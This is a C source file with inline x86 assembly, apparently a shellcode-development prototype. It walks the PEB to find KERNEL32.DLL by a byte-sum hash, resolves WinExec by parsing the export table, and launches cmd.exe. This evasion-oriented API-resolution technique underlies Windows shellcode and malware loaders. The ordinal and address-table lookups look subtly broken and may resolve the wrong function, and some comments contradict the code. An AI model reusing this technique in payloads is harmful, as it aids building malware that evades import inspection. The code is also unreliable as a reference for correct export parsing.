#include <Windows.h>

void exploit()
{
	//const int kernel32_string_hash = 816; //KERNEL32.DLL (Unicode string) hash value

	int* base;
	int* rdata;

	__asm
	{
		xor edi, edi;

		//eax holds PEB
		//usermode fs register is pointing the PEB
		mov eax, fs:0x30;

		//eax holds LDR address
		mov eax, [eax + 12];
		//LIST_ENTRY InMemoryOrderModuleList
		mov eax, [eax + 20];
		
	get_next_front_link:;

		//mov FLink (front link)
		mov eax, [eax];

		/*
typedef struct _LSA_UNICODE_STRING {
	USHORT Length;			// + 36
	USHORT MaximumLength;	// + 38
	PWSTR  Buffer;			// + 40
} LSA_UNICODE_STRING, * PLSA_UNICODE_STRING, UNICODE_STRING, * PUNICODE_STRING;
		*/

		//ebx holds DllNameLength
		//4 byte to 2 byte (USHORT Length)
		
		//ebx holds DllNameLength
		movsx ebx, word ptr[eax + 36];

		//edx holds DllName
		//40	 = name path
		//40 - 8 = full path
		mov edx, [eax + 40];

		//initailize register
		xor esi, esi;
		xor ecx, ecx;

	get_hash_lable:;

		movsx edi, byte ptr[edx + esi];	//a = dll[x]
		add ecx, edi;						//hash += a;

		add esi, 1;		//add index
		cmp esi, ebx;	
		//cmp index, DllNameLength
		//if not equals, while
		jne get_hash_lable;	
		
		cmp ecx, 816; //KERNEL32.DLL string hash value
		// if not equals the KERNEL32.DLL hash
		jne get_next_front_link;

		//if equals the KERNEL32.DLL hash

		//edi holds DllBase (Dll address)
		mov ebx, [eax + 16];

		//Image dos header
		//0x3C offset pointing value is 0xE8
		//0xE8 value means 'Offset to new EXE header' *(PE..)
		mov edi, [ebx + 0x3c];  //PE Header location
		add edi, ebx;			//add DllBase
		mov edi, [edi + 0x78];	//IMAGE_OPTIONAL_HEADER in Export Table RVA address
		add edi, ebx;			//add DllBase
		mov edx, edi;			//.rdata IMAGE_EXPORT_DIRECTORY
		
		mov dword ptr[rdata], edx;	//.rdata export table
		mov dword ptr[base], ebx;	//MZ
	}
	
	int EAT; //Export Address Table
	int NPT; //Name Pointer Table
	int OT;	 //Ordinal Table
	
	//get info
	EAT = * (rdata + 7); //sizeof(int) * 7 (28) Export Address Table RVA
	NPT = * (rdata + 8); //sizeof(int) * 8 (32) Name Pointer Table RVA
	OT = * (rdata + 9);	 //sizeof(int) * 9 (36) Ordinal Table RVA

	//Get VA (Virtual Address)
	NPT += (int)base;
	
	int* ptr = NULL;
	
	//Check API Name in 'Name Pointer Table'
	int index = 0;
	for (;;)
	{
		ptr = (int*)NPT + index;
		index++;

		if (lstrcmpiA((char*)*ptr + (int)base, "WinExec") == 0)
		{
			break;
		}
	}


	//index is Ordinal
	WORD Ordinal = index;

	//Get Ordinal value in 'Ordinal Table'
	OT += (int)base;
	index = 0;

	//Ordinal value is 'word'
	WORD* wdPtr = NULL;
	for (;;)
	{
		wdPtr = (WORD*)OT + index;
		index++;
		
		if ((WORD)*wdPtr == Ordinal)
		{
			break;
		}
	}
	//add 1 Ordinal
	Ordinal += 1;
	
	//Get API address from 'Export Address Table'
	EAT += (int)base;
	index = 0;

	for (;;)
	{
		ptr = (int*)EAT + index;
		index++;

		//compare 'Ordinal value'
		if (index == Ordinal)
		{
			break;
		}
	}

	//'*ptr' is RVA
	//'base' is base address

	//*ptr + (int)base is VA (API address)

	//printf("WinExec=%p\n", WinExec);
	//printf("ptr=%p\n", *ptr + (int)base);
	
	int _WinExec = *ptr + (int)base;

	((int (*) (const char*, int))_WinExec)("cmd.exe", SW_SHOW);

	return;
}


int main()
{
	exploit();

	return 0;
}